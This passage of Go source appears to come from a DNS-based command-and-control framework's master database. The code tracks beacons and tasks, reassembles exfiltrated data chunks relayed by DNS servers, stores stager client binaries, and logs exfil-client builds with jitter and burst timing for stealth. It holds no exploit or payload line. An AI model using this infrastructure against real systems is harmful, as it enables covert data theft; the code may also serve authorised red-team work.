			totalChunks = expectedTotal
			dbLog("Task %s: Updated chunk %d with totalChunks=%d from task metadata\n", taskID, chunkIndex, totalChunks)
			// If single-chunk result, mark as complete
			if expectedTotal == 1 && chunkIndex == 1 {
				isComplete = 1
			}
		}
	}

	// Insert the chunk (for single-chunk results or individual chunks from multi-chunk results)
	// Use INSERT OR REPLACE to handle duplicate chunks from DNS retries or load balancing
	_, err = d.db.Exec(`
		INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)
	`, taskID, beaconID, dnsServerID, data, now, chunkIndex, totalChunks, isComplete)

	if err != nil {
		// Don't log FK errors for D tasks (discovery tasks don't need result storage)
		if !strings.HasPrefix(taskID, "D") || !strings.Contains(err.Error(), "FOREIGN KEY constraint failed") {
			dbLogAlways("Error saving result chunk: %v\n", err)
		}
		return err
	}

	// Only log result storage for non-discovery tasks
	if !strings.HasPrefix(taskID, "D") && chunkIndex >= 1 {
		if totalChunks == 1 {
			dbLog("Saved single-chunk result for task %s from %s (%d bytes)\n", taskID, dnsServerID, len(data))
		} else {
			dbLog("Saved chunk %d/%d for task %s from %s\n", chunkIndex, totalChunks, taskID, dnsServerID)
		}
	}

	// Update task status to "exfiltrating" when first chunk arrives (unless it's already completed)
	// For 1-indexed chunks: chunkIndex >= 1
	// For 0-indexed assembled: chunkIndex == 0 and totalChunks > 1
	if chunkIndex >= 1 || (chunkIndex == 0 && totalChunks > 1) {
		var currentStatus string
		err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&currentStatus)
		statusWasSent := false
		if err == nil && currentStatus == "sent" {
			statusWasSent = true
			now := time.Now().Unix()
			_, err = d.db.Exec("UPDATE tasks SET status = ?, updated_at = ? WHERE id = ?", "exfiltrating", now, taskID)
			if err == nil {
				dbLog("Task %s status: sent -> exfiltrating (first chunk received)\n", taskID)
			}
		}

		// SHADOW MESH: Check for pending completions when single-chunk result arrives
		// This handles race condition where RESULT_COMPLETE arrived before data
		// Check both when status was "exfiltrating" OR when we just transitioned from "sent"
		if err == nil && chunkIndex == 1 && (currentStatus == "exfiltrating" || statusWasSent) {
			// Check if there's a pending completion for this task
			_, pendingTotalChunks, hasPending := d.getPendingCompletion(taskID)

			// Complete if: known single-chunk OR pending completion says it's single-chunk
			if totalChunks == 1 || (hasPending && pendingTotalChunks == 1) {
				dbLog("Single-chunk result arrived after completion signal, marking complete now\n")
				// Update the chunk to have correct total_chunks if it was 0
				if totalChunks == 0 && pendingTotalChunks == 1 {
					d.db.Exec(`UPDATE task_results SET total_chunks = 1, is_complete = 1 WHERE task_id = ? AND chunk_index = 1`, taskID)
				}
				d.markTaskCompleted(taskID)
				d.clearPendingCompletion(taskID)
			}
		}
	}

	// NEW THREE-PHASE PROTOCOL: Do NOT mark task as completed here
	// Only the RESULT_COMPLETE message (via MarkTaskCompleteFromBeacon) should mark tasks complete
	// This prevents premature completion when failure messages arrive before real results
	if isComplete == 1 && !strings.HasPrefix(taskID, "D") {
		dbLog("Stored complete chunk for task %s (waiting for RESULT_COMPLETE signal)\n", taskID)
	}

	// SHADOW MESH: Handle chunks from DNS servers that didn't receive META
	// If totalChunks is 0 or unknown, try to get it from:
	// 1. Task's chunk_count field (set by metadata notification)
	// 2. Existing chunks in task_results
	if totalChunks == 0 && chunkIndex > 0 {
		// First, try the task's chunk_count (set by RESULT_META)
		var taskChunkCount sql.NullInt64
		err = d.db.QueryRow(`SELECT chunk_count FROM tasks WHERE id = ?`, taskID).Scan(&taskChunkCount)
		if err == nil && taskChunkCount.Valid && taskChunkCount.Int64 > 0 {
			totalChunks = int(taskChunkCount.Int64)
			// Update this chunk's total_chunks for consistency
			d.db.Exec(`UPDATE task_results SET total_chunks = ? WHERE task_id = ? AND chunk_index = ?`,
				totalChunks, taskID, chunkIndex)
			dbLog("Task %s: Updated chunk %d with totalChunks=%d from task metadata\n",
				taskID, chunkIndex, totalChunks)
		} else {
			// Fallback: try to get it from other chunks
			var knownTotalChunks sql.NullInt64
			err = d.db.QueryRow(`
				SELECT total_chunks FROM task_results 
				WHERE task_id = ? AND total_chunks > 0 
				LIMIT 1
			`, taskID).Scan(&knownTotalChunks)

			if err == nil && knownTotalChunks.Valid {
				totalChunks = int(knownTotalChunks.Int64)
				// Update this chunk's total_chunks for consistency
				d.db.Exec(`UPDATE task_results SET total_chunks = ? WHERE task_id = ? AND chunk_index = ?`,
					totalChunks, taskID, chunkIndex)
				dbLog("Task %s: Updated chunk %d with totalChunks=%d from other chunks\n",
					taskID, chunkIndex, totalChunks)
			}
		}
	}

	// If this is a multi-chunk result (and not the complete assembled one), check if we have all chunks
	if totalChunks > 1 && chunkIndex > 0 {
		// Check if we already have the complete assembled result
		var existingID int
		err = d.db.QueryRow(`
			SELECT id FROM task_results 
			WHERE task_id = ? AND chunk_index = 0 AND total_chunks = ? AND is_complete = 1
			LIMIT 1
		`, taskID, totalChunks).Scan(&existingID)

		if err == nil {
			// Already have complete result (probably from DNS server that assembled it)
			dbLog("Task %s already has complete result (id=%d), skipping reassembly\n", taskID, existingID)
			return nil
		}
		if err != sql.ErrNoRows {
			dbLogAlways("Error checking existing result for task %s: %v\n", taskID, err)
			return err
		}

		// Count how many individual chunks we have for this task
		var chunkCount int
		err = d.db.QueryRow(`
			SELECT COUNT(DISTINCT chunk_index) 
			FROM task_results 
			WHERE task_id = ? AND chunk_index > 0
		`, taskID).Scan(&chunkCount)

		if err != nil {
			dbLogAlways("Error counting chunks for task %s: %v\n", taskID, err)
			return err
		}

		dbLog("Task %s progress: %d/%d chunks received (just received chunk %d)\n", taskID, chunkCount, totalChunks, chunkIndex)

		if chunkCount == totalChunks {
			// We have all chunks! Trigger reassembly in goroutine to avoid blocking other submissions
			dbLogAlways("All %d chunks received for task %s, triggering async reassembly...\n", totalChunks, taskID)
			done := make(chan struct{})
			go func() {
				defer func() {
					if r := recover(); r != nil {
						dbLogAlways("PANIC in reassembleChunkedResult for task %s: %v\n", taskID, r)
						// Mark task as failed on panic
						now := time.Now().Unix()
						d.db.Exec(`
							UPDATE tasks 
							SET status = 'failed', completed_at = ?, updated_at = ?
							WHERE id = ? AND status != 'completed'
						`, now, now, taskID)
					}
				}()

				d.reassembleChunkedResult(taskID, beaconID, totalChunks)
				close(done)
			}()

			select {
			case <-done:
				// Reassembly completed successfully
			case <-time.After(30 * time.Second):
				dbLogAlways("Warning: Reassembly timeout for task %s after 30s\n", taskID)
				// Mark task as partial - reassembly took too long
				now := time.Now().Unix()
				d.db.Exec(`
					UPDATE tasks 
					SET status = 'partial', completed_at = ?, updated_at = ?
					WHERE id = ? AND status != 'completed'
				`, now, now, taskID)
			}
		} else if chunkCount > totalChunks {
			// This shouldn't happen but log if it does
			dbLogAlways("Warning: Task %s has %d chunks but expected %d (duplicate chunks from load balancing?)\n",
				taskID, chunkCount, totalChunks)
		} else {
			// Show chunk gaps if we're missing a lot
			if totalChunks-chunkCount > 20 {
				var minChunk, maxChunk int
				d.db.QueryRow(`SELECT MIN(chunk_index), MAX(chunk_index) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&minChunk, &maxChunk)
				dbLog("Task %s chunk range: %d-%d (missing %d chunks)\n", taskID, minChunk, maxChunk, totalChunks-chunkCount)
			}
		}
	}

	// SHADOW MESH: Check if we already received RESULT_COMPLETE before all chunks arrived
	// This can happen when completion signal arrives at a different DNS server than chunks
	pendingBeaconID, pendingTotalChunks, hasPending := d.getPendingCompletion(taskID)
	if hasPending {
		if pendingTotalChunks <= 0 {
			pendingTotalChunks = 1
		}

		// Count how many chunks we now have
		var currentChunkCount int
		err = d.db.QueryRow(`
			SELECT COUNT(DISTINCT chunk_index) 
			FROM task_results 
			WHERE task_id = ? AND chunk_index > 0
		`, taskID).Scan(&currentChunkCount)

		if err == nil && currentChunkCount >= pendingTotalChunks {
			// We now have all chunks - finalize the task
			dbLog("Pending completion satisfied: task %s has %d/%d chunks, finalizing\n",
				taskID, currentChunkCount, pendingTotalChunks)

			completionBeacon := beaconID
			if completionBeacon == "" {
				completionBeacon = pendingBeaconID
			}

			if err := d.MarkTaskCompleteFromBeacon(taskID, completionBeacon, pendingTotalChunks); err != nil {
				dbLogAlways("Error finalizing pending completion for task %s: %v\n", taskID, err)
			}
		}
	}

	return nil
}

// reassembleChunkedResult combines all chunks into a complete result
// Can be called asynchronously without holding mutex
func (d *MasterDatabase) reassembleChunkedResult(taskID, beaconID string, totalChunks int) {
	// Use mutex only for final insert/update operations
	// Database queries are safe due to WAL mode

	// Check if we already have a complete assembled result (avoid duplicate work)
	var existingID int
	err := d.db.QueryRow(`
		SELECT id FROM task_results 
		WHERE task_id = ? AND chunk_index = 0 AND total_chunks = ? AND is_complete = 1 AND dns_server_id IN ('master-assembled', ?)
		LIMIT 1
	`, taskID, totalChunks, beaconID).Scan(&existingID)

	if err == nil {
		// Already assembled, skip
		return
	}
	if err != sql.ErrNoRows {
		dbLogAlways("Error checking assembled result for task %s: %v\n", taskID, err)
		return
	}

	// Fetch all chunks in order
	rows, err := d.db.Query(`
		SELECT chunk_index, result_data 
		FROM task_results 
		WHERE task_id = ? AND chunk_index > 0
		ORDER BY chunk_index ASC
	`, taskID)

	if err != nil {
		dbLogAlways("Error fetching chunks for reassembly: %v\n", err)
		return
	}
	defer rows.Close()

	// Build chunk map (handle potential duplicates from multiple DNS servers)
	chunks := make(map[int]string)
	for rows.Next() {
		var index int
		var data string
		if err := rows.Scan(&index, &data); err != nil {
			dbLogAlways("Error scanning chunk: %v\n", err)
			return
		}
		// If we have multiple copies of same chunk from different servers, just use first one
		if _, exists := chunks[index]; !exists {
			chunks[index] = data
		}
	}

	// Verify we have all chunks
	if len(chunks) != totalChunks {
		dbLogAlways("Incomplete chunks for task %s: have %d unique chunks, need %d\n",
			taskID, len(chunks), totalChunks)

		// Mark task as partial - not all chunks received
		now := time.Now().Unix()
		_, err := d.db.Exec(`
			UPDATE tasks 
			SET status = 'partial', completed_at = ?, updated_at = ?
			WHERE id = ? AND status != 'completed'
		`, now, now, taskID)

		if err != nil {
			dbLogAlways("Error marking task %s as partial: %v\n", taskID, err)
		} else {
			dbLogAlways("Task %s marked as 'partial' (missing chunks: expected %d, got %d)\n",
				taskID, totalChunks, len(chunks))
		}
		return
	}

	// Reassemble in order
	var completeResult strings.Builder
	for i := 1; i <= totalChunks; i++ {
		data, exists := chunks[i]
		if !exists {
			dbLog("Missing chunk %d for task %s\n", i, taskID)
			return
		}
		completeResult.WriteString(data)
	}

	// Store the complete result with chunk_index=0 to indicate it's the assembled version
	// Use INSERT OR REPLACE to handle edge cases
	now := time.Now().Unix()
	_, err = d.db.Exec(`
		INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
		VALUES (?, ?, 'master-assembled', ?, ?, 0, ?, 1)
	`, taskID, beaconID, completeResult.String(), now, totalChunks)

	if err != nil {
		dbLogAlways("Error storing assembled result for task %s: %v\n", taskID, err)

		// Mark task as failed if we can't store the result
		now := time.Now().Unix()
		_, updateErr := d.db.Exec(`
			UPDATE tasks 
			SET status = 'failed', completed_at = ?, updated_at = ?
			WHERE id = ? AND status != 'completed'
		`, now, now, taskID)

		if updateErr != nil {
			dbLogAlways("Error marking task %s as failed: %v\n", taskID, updateErr)
		} else {
			dbLogAlways("Task %s marked as 'failed' (database error during reassembly)\n", taskID)
		}
		return
	}

	// Mark task as completed
	d.markTaskCompleted(taskID)

	dbLogAlways("Reassembly complete for task %s: %d chunks combined -> %d bytes total\n",
		taskID, totalChunks, completeResult.Len())

	// Verify task status was updated
	var taskStatus string
	if err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&taskStatus); err == nil {
		dbLog("Task %s status is now: %s\n", taskID, taskStatus)
		if taskStatus != "completed" {
			dbLogAlways("Warning: Task %s status is '%s' instead of 'completed'!\n", taskID, taskStatus)
		}
	}
}

// GetTaskResult retrieves the complete result for a task
func (d *MasterDatabase) GetTaskResult(taskID string) (string, bool, error) {
	// First try to get the complete result
	// chunk_index = 0: Assembled multi-chunk result OR legacy single-chunk
	// chunk_index = 1 AND total_chunks IN (0,1): New 1-indexed single-chunk result
	// (total_chunks could be 0 if metadata hadn't arrived yet, or 1 if it did)
	var resultData string
	var isComplete int

	err := d.db.QueryRow(`
		SELECT result_data, is_complete 
		FROM task_results 
		WHERE task_id = ? AND is_complete = 1 AND (
			chunk_index = 0 OR (chunk_index = 1 AND total_chunks <= 1)
		)
		ORDER BY received_at DESC
		LIMIT 1
	`, taskID).Scan(&resultData, &isComplete)

	if err == sql.ErrNoRows {
		// No complete result yet, check if we have partial chunks
		var chunkCount int
		d.db.QueryRow(`
			SELECT COUNT(*) FROM task_results WHERE task_id = ?
		`, taskID).Scan(&chunkCount)

		if chunkCount > 0 {
			return "", false, nil // Partial result exists
		}
		return "", false, fmt.Errorf("no result found")
	}

	if err != nil {
		return "", false, err
	}

	return resultData, true, nil
}

// GetTaskResultProgress returns chunk progress for a multi-chunk result
func (d *MasterDatabase) GetTaskResultProgress(taskID string) (int, int, error) {

	// Get total chunks and received count
	var totalChunks, receivedChunks int

	err := d.db.QueryRow(`
		SELECT 
			MAX(total_chunks) as total,
			COUNT(DISTINCT chunk_index) as received
		FROM task_results 
		WHERE task_id = ? AND chunk_index > 0
	`, taskID).Scan(&totalChunks, &receivedChunks)

	if err == sql.ErrNoRows {
		return 0, 0, nil
	}

	return receivedChunks, totalChunks, err
}

// MarkTaskDelivered atomically marks a task as delivered by a specific DNS server
// Returns true if this server successfully claimed the task, false if already claimed
func (d *MasterDatabase) MarkTaskDelivered(taskID, dnsServerID string) (bool, error) {

	now := time.Now().Unix()

	// Atomic update: only succeed if task is still pending
	result, err := d.db.Exec(`
		UPDATE tasks 
		SET status = 'sent',
		    delivered_by_dns_server = ?,
		    sent_at = ?,
		    updated_at = ?
		WHERE id = ? AND status = 'pending'
	`, dnsServerID, now, now, taskID)

	if err != nil {
		return false, err
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return false, err
	}

	// If rowsAffected == 0, task was already delivered by another DNS server
	return rowsAffected > 0, nil
}

// Client Binary operations

// SaveClientBinary stores a pre-built client binary with chunks for stager deployment
func (d *MasterDatabase) SaveClientBinary(id, filename, os, arch, version, base64Data, dnsDomains string,
	originalSize, compressedSize, base64Size, chunkSize, totalChunks int, createdBy, buildID, buildConfig string) error {

	now := time.Now().Unix()

	var createdByVal interface{}
	if createdBy == "" {
		createdByVal = nil
	} else {
		createdByVal = createdBy
	}

	var buildIDVal interface{}
	if buildID == "" {
		buildIDVal = nil
	} else {
		buildIDVal = buildID
	}

	fmt.Printf("[DB] Saving client binary: id=%s, build_id=%s, filename=%s, os=%s, arch=%s, chunks=%d\n",
		id, buildID, filename, os, arch, totalChunks)

	_, err := d.db.Exec(`
		INSERT INTO client_binaries (id, filename, os, arch, version, original_size, compressed_size,
			base64_size, chunk_size, total_chunks, base64_data, dns_domains, created_at, created_by, build_id, build_config)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, id, filename, os, arch, version, originalSize, compressedSize, base64Size, chunkSize,
		totalChunks, base64Data, dnsDomains, now, createdByVal, buildIDVal, buildConfig)

	if err != nil {
		fmt.Printf("[DB] ERROR saving client binary: %v\n", err)
		return err
	}

	fmt.Printf("[DB] Client binary saved successfully: %s\n", id)
	return nil
}

// UpdateBeaconStatus updates a beacon's status (e.g., "active", "exfiltrating")
func (d *MasterDatabase) UpdateBeaconStatus(beaconID, status string) error {

	_, err := d.db.Exec(`UPDATE beacons SET status = ?, updated_at = ? WHERE id = ?`,
		status, time.Now().Unix(), beaconID)
	return err
}

// GetBeaconIDsByStatus returns beacon IDs matching a given status.
func (d *MasterDatabase) GetBeaconIDsByStatus(status string) ([]string, error) {

	rows, err := d.db.Query(`SELECT id FROM beacons WHERE status = ?`, status)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var ids []string
	for rows.Next() {
		var id string
		if err := rows.Scan(&id); err != nil {
			return nil, err
		}
		ids = append(ids, id)
	}
	return ids, nil
}

// GetBuildConfigByBuildID looks up build config from client_binaries by the short build ID
func (d *MasterDatabase) GetBuildConfigByBuildID(buildID string) (BuildConfig, error) {

	var id, buildConfigStr, binaryOS, arch, dnsDomains string
	var createdAt int64

	err := d.db.QueryRow(`
		SELECT id, COALESCE(build_config, ''), os, arch, COALESCE(dns_domains, ''), created_at
		FROM client_binaries
		WHERE build_id = ?
	`, buildID).Scan(&id, &buildConfigStr, &binaryOS, &arch, &dnsDomains, &createdAt)

	if err == sql.ErrNoRows {
		return BuildConfig{}, nil
	}
	if err != nil {
		return BuildConfig{}, err
	}

	result := BuildConfig{
		BinaryID:   id,
		BuildID:    buildID,
		OS:         binaryOS,
		Arch:       arch,
		DNSDomains: dnsDomains,
		CreatedAt:  time.Unix(createdAt, 0).Format(time.RFC3339),
	}

	if buildConfigStr != "" {
		var config map[string]interface{}
		if err := json.Unmarshal([]byte(buildConfigStr), &config); err == nil {
			result.Extra = config
		}
	}

	return result, nil
}

// GetDistinctBuildFormats returns all unique payload formats from build configs.
// Used to push known formats to DNS servers so they can decode formatted CHK queries.
func (d *MasterDatabase) GetDistinctBuildFormats() ([]string, error) {

	rows, err := d.db.Query(`
		SELECT DISTINCT build_config FROM client_binaries
		WHERE build_config IS NOT NULL AND build_config != ''
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	seen := make(map[string]bool)
	for rows.Next() {
		var raw string
		if err := rows.Scan(&raw); err != nil {
			continue
		}
		var cfg map[string]interface{}
		if err := json.Unmarshal([]byte(raw), &cfg); err != nil {
			continue
		}
		for _, key := range []string{"registration_phase", "poll_phase", "data_exfil_phase"} {
			if phase, ok := cfg[key].(map[string]interface{}); ok {
				if fmt, ok := phase["payload_format"].(string); ok && fmt != "" {
					seen[fmt] = true
				}
			}
		}
		if fmt, ok := cfg["payload_format"].(string); ok && fmt != "" {
			seen[fmt] = true
		}
	}

	formats := make([]string, 0, len(seen))
	for f := range seen {
		formats = append(formats, f)
	}
	return formats, nil
}

// GetBuildPhaseConfigs returns per-build phase configs (keyed by build_id) for all
// builds that have at least one A-record ACK IP set. DNS servers cache these so they
// can return the correct IPs from the very first CHK query without waiting for an
// async round-trip to Archon.
func (d *MasterDatabase) GetBuildPhaseConfigs() (map[string]BuildPhaseConfig, error) {

	rows, err := d.db.Query(`
		SELECT build_id, build_config FROM client_binaries
		WHERE build_config IS NOT NULL AND build_config != '' AND build_id IS NOT NULL AND build_id != ''
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	result := make(map[string]BuildPhaseConfig)
	for rows.Next() {
		var buildID, raw string
		if err := rows.Scan(&buildID, &raw); err != nil {
			continue
		}
		var cfg map[string]interface{}
		if err := json.Unmarshal([]byte(raw), &cfg); err != nil {
			continue
		}
		var pc BuildPhaseConfig
		hasIP := false
		if reg, ok := cfg["registration_phase"].(map[string]interface{}); ok {
			regPhase := make(map[string]interface{})
			if qt, ok := reg["query_type"].(string); ok {
				regPhase["query_type"] = qt
			}
			if enc, ok := reg["encrypted"].(bool); ok {
				regPhase["encrypted"] = enc
			}
			if ip, ok := reg["a_record_ack_ip"].(string); ok && ip != "" {
				regPhase["a_record_ack_ip"] = ip
				hasIP = true
			}
			pc.RegistrationPhase = regPhase
		}
		if poll, ok := cfg["poll_phase"].(map[string]interface{}); ok {
			pollPhase := make(map[string]interface{})
			if qt, ok := poll["query_type"].(string); ok {
				pollPhase["query_type"] = qt
			}
			if enc, ok := poll["encrypted"].(bool); ok {
				pollPhase["encrypted"] = enc
			}
			if ip, ok := poll["a_record_ack_ip"].(string); ok && ip != "" {
				pollPhase["a_record_ack_ip"] = ip
				hasIP = true
			}
			if ip, ok := poll["a_record_task_ip"].(string); ok && ip != "" {
				pollPhase["a_record_task_ip"] = ip
				hasIP = true
			}
			if secs, ok := poll["txt_follow_up_secs"].(float64); ok {
				pollPhase["txt_follow_up_secs"] = int(secs)
			}
			pc.PollPhase = pollPhase
		}
		if exfil, ok := cfg["data_exfil_phase"].(map[string]interface{}); ok {
			exfilPhase := make(map[string]interface{})
			if qt, ok := exfil["query_type"].(string); ok {
				exfilPhase["query_type"] = qt
			}
			if enc, ok := exfil["encrypted"].(bool); ok {
				exfilPhase["encrypted"] = enc
			}
			if ip, ok := exfil["a_record_ack_ip"].(string); ok && ip != "" {
				exfilPhase["a_record_ack_ip"] = ip
				hasIP = true
			}
			pc.DataExfilPhase = exfilPhase
		}
		if hasIP {
			result[buildID] = pc
		}
	}
	return result, nil
}

// GetClientBinaries retrieves all stored client binaries
func (d *MasterDatabase) GetClientBinaries() ([]ClientBinary, error) {

	fmt.Printf("[DB] Querying client_binaries table...\n")

	rows, err := d.db.Query(`
		SELECT id, filename, os, arch, version, original_size, compressed_size,
			base64_size, chunk_size, total_chunks, dns_domains, created_at, created_by
		FROM client_binaries
		ORDER BY created_at DESC
	`)
	if err != nil {
		fmt.Printf("[DB] ERROR querying client_binaries: %v\n", err)
		return nil, err
	}
	defer rows.Close()

	var binaries []ClientBinary
	rowCount := 0
	for rows.Next() {
		rowCount++
		var id, filename, os, arch, version, dnsDomains string
		var createdBy sql.NullString // Use sql.NullString for nullable column
		var originalSize, compressedSize, base64Size, chunkSize, totalChunks int
		var createdAt int64

		err := rows.Scan(&id, &filename, &os, &arch, &version, &originalSize, &compressedSize,
			&base64Size, &chunkSize, &totalChunks, &dnsDomains, &createdAt, &createdBy)
		if err != nil {
			fmt.Printf("[DB] ERROR scanning row %d: %v\n", rowCount, err)
			continue
		}

		fmt.Printf("[DB] Found binary: id=%s, os=%s, arch=%s, chunks=%d\n", id, os, arch, totalChunks)

		// Convert sql.NullString to string (empty string if NULL)
		createdByStr := ""
		if createdBy.Valid {
			createdByStr = createdBy.String
		}

		binaries = append(binaries, ClientBinary{
			ID:             id,
			Filename:       filename,
			OS:             os,
			Arch:           arch,
			Version:        version,
			OriginalSize:   originalSize,
			CompressedSize: compressedSize,
			Base64Size:     base64Size,
			ChunkSize:      chunkSize,
			TotalChunks:    totalChunks,
			DNSDomains:     dnsDomains,
			CreatedAt:      createdAt,
			CreatedBy:      createdByStr,
		})
	}

	fmt.Printf("[DB] Query complete: found %d binaries\n", len(binaries))
	return binaries, rows.Err()
}

// GetClientBinary retrieves a specific client binary by ID
func (d *MasterDatabase) GetClientBinary(id string) (ClientBinary, error) {

	var filename, os, arch, version, base64Data, dnsDomains string
	var createdBy sql.NullString
	var originalSize, compressedSize, base64Size, chunkSize, totalChunks int
	var createdAt int64

	err := d.db.QueryRow(`
		SELECT id, filename, os, arch, version, original_size, compressed_size,
			base64_size, chunk_size, total_chunks, base64_data, dns_domains, created_at, created_by
		FROM client_binaries
		WHERE id = ?
	`, id).Scan(&id, &filename, &os, &arch, &version, &originalSize, &compressedSize,
		&base64Size, &chunkSize, &totalChunks, &base64Data, &dnsDomains, &createdAt, &createdBy)

	if err != nil {
		return ClientBinary{}, err
	}

	_ = base64Data // scanned but not in struct

	createdByStr := ""
	if createdBy.Valid {
		createdByStr = createdBy.String
	}

	return ClientBinary{
		ID:             id,
		Filename:       filename,
		OS:             os,
		Arch:           arch,
		Version:        version,
		OriginalSize:   originalSize,
		CompressedSize: compressedSize,
		Base64Size:     base64Size,
		ChunkSize:      chunkSize,
		TotalChunks:    totalChunks,
		DNSDomains:     dnsDomains,
		CreatedAt:      createdAt,
		CreatedBy:      createdByStr,
	}, nil
}

// Exfil client build records

type ExfilClientBuildRecord struct {
	ID             string
	Filename       string
	OS             string
	Arch           string
	Domains        string
	Resolvers      string
	ServerIP       string
	ChunkBytes     int
	JitterMinMs    int
	JitterMaxMs    int
	ChunksPerBurst int
	BurstPauseMs   int
	FilePath       string
	FileSize       int64
}

// SaveExfilClientBuild persists metadata about a compiled exfil client binary
func (d *MasterDatabase) SaveExfilClientBuild(record *ExfilClientBuildRecord) error {
	if record == nil {
		return fmt.Errorf("nil exfil client build record")
	}


	_, err := d.db.Exec(`
		INSERT INTO exfil_client_builds (
			id, filename, os, arch, domains, resolvers, server_ip,
			chunk_bytes, jitter_min_ms, jitter_max_ms, chunks_per_burst,
			burst_pause_ms, file_path, file_size, created_at
		) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`,
		record.ID,
		record.Filename,
		record.OS,
		record.Arch,
		record.Domains,
		record.Resolvers,
		record.ServerIP,
		record.ChunkBytes,
		record.JitterMinMs,
		record.JitterMaxMs,
		record.ChunksPerBurst,
		record.BurstPauseMs,
		record.FilePath,
		record.FileSize,
		time.Now().Unix(),
	)

	return err
}

// ListExfilClientBuilds returns recent exfil client builds for operator visibility
func encodeStringSliceJSON(values []string) string {
	clean := make([]string, 0, len(values))
	for _, v := range values {
		trimmed := strings.TrimSpace(v)
		if trimmed != "" {
			clean = append(clean, trimmed)
		}
	}
	if len(clean) == 0 {
		return "[]"
	}
	data, err := json.Marshal(clean)
	if err != nil {
		return "[]"
	}
	return string(data)
}

func decodeStringSliceJSON(raw string) []string {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return nil
	}
	var values []string
	if err := json.Unmarshal([]byte(trimmed), &values); err == nil {
		return values
	}
	parts := strings.Split(trimmed, ",")
	var result []string
	for _, part := range parts {
		val := strings.TrimSpace(part)
		if val != "" {
			result = append(result, val)
		}
	}
	if len(result) == 0 {
		return nil
	}
	return result
}

func nullableString(value string) interface{} {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	return value
}

func nullableInt64(value int64) interface{} {
	if value == 0 {
		return nil
	}
	return value
}

func (d *MasterDatabase) ListExfilClientBuilds(limit int) ([]map[string]interface{}, error) {
	if limit <= 0 {
		limit = 50
	}


	rows, err := d.db.Query(`
		SELECT id, filename, os, arch, domains, resolvers, server_ip,
		       chunk_bytes, jitter_min_ms, jitter_max_ms, chunks_per_burst,
		       burst_pause_ms, file_path, file_size, created_at
		FROM exfil_client_builds
		ORDER BY created_at DESC
		LIMIT ?
	`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var builds []map[string]interface{}
	for rows.Next() {
		var (
			id, filename, osName, arch, domains, resolvers, serverIP, filePath string
			chunkBytes, jitterMin, jitterMax, chunksPerBurst, burstPause       int
			fileSize                                                           int64
			createdAt                                                          int64
		)

		if err := rows.Scan(&id, &filename, &osName, &arch, &domains, &resolvers, &serverIP,
			&chunkBytes, &jitterMin, &jitterMax, &chunksPerBurst, &burstPause,
			&filePath, &fileSize, &createdAt); err != nil {
			return nil, err
		}

		builds = append(builds, map[string]interface{}{
			"id":               id,
			"filename":         filename,
			"os":               osName,
			"arch":             arch,
			"domains":          domains,
			"resolvers":        resolvers,
			"server_ip":        serverIP,
			"chunk_bytes":      chunkBytes,
			"jitter_min_ms":    jitterMin,
			"jitter_max_ms":    jitterMax,
			"chunks_per_burst": chunksPerBurst,
			"burst_pause_ms":   burstPause,
			"file_path":        filePath,
			"file_size":        fileSize,
			"created_at":       createdAt,
		})
	}

	return builds, rows.Err()
}

func (d *MasterDatabase) InsertExfilBuildJob(job *ExfilBuildJob) error {
	if job == nil {
		return fmt.Errorf("nil exfil build job")
	}

	created := job.CreatedAt
	if created.IsZero() {
		created = time.Now()
	}
	updated := job.UpdatedAt
	if updated.IsZero() {
		updated = created
	}

	var completed interface{}
	if job.CompletedAt != nil {
		completed = job.CompletedAt.Unix()
	}

	var artifactFilename, artifactPath, artifactDownloadPath, artifactSize interface{}
	if job.Artifact != nil {
		artifactFilename = nullableString(job.Artifact.Filename)
		artifactPath = nullableString(job.Artifact.DownloadPath)
		artifactDownloadPath = nullableString(job.Artifact.DownloadPath)
		artifactSize = nullableInt64(job.Artifact.Size)
	}

	status := job.Status
	if strings.TrimSpace(status) == "" {
		status = "queued"
	}

	_, err := d.db.Exec(`
		INSERT INTO exfil_build_jobs (
			id, status, message, error, platform, architecture,
			chunk_bytes, jitter_min_ms, jitter_max_ms, chunks_per_burst,
			burst_pause_ms, server_ip, domains, resolvers,
			artifact_filename, artifact_path, artifact_download_path, artifact_size,
			created_at, updated_at, completed_at
		) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`,
		job.ID,
		status,
		job.Message,
		job.Error,
		job.Platform,
		job.Architecture,
		job.ChunkBytes,
		job.JitterMinMs,
		job.JitterMaxMs,
		job.ChunksPerBurst,
		job.BurstPauseMs,
		job.ServerIP,
		encodeStringSliceJSON(job.Domains),
		encodeStringSliceJSON(job.Resolvers),
		artifactFilename,
		artifactPath,
		artifactDownloadPath,
		artifactSize,
		created.Unix(),
		updated.Unix(),
		completed,
	)

	return err
}

func (d *MasterDatabase) UpdateExfilBuildJob(job *ExfilBuildJob) error {
	if job == nil {
		return fmt.Errorf("nil exfil build job")
	}

	updated := job.UpdatedAt
	if updated.IsZero() {
		updated = time.Now()
	}

	var completed interface{}
	if job.CompletedAt != nil {
		completed = job.CompletedAt.Unix()
	}

	var artifactFilename, artifactPath, artifactDownloadPath, artifactSize interface{}
	if job.Artifact != nil {
		artifactFilename = nullableString(job.Artifact.Filename)
		artifactPath = nullableString(job.Artifact.DownloadPath)
		artifactDownloadPath = nullableString(job.Artifact.DownloadPath)
		artifactSize = nullableInt64(job.Artifact.Size)
	}

	status := job.Status
	if strings.TrimSpace(status) == "" {
		status = "queued"
	}

	result, err := d.db.Exec(`
		UPDATE exfil_build_jobs
		SET status = ?,
			message = ?,
			error = ?,
			platform = ?,
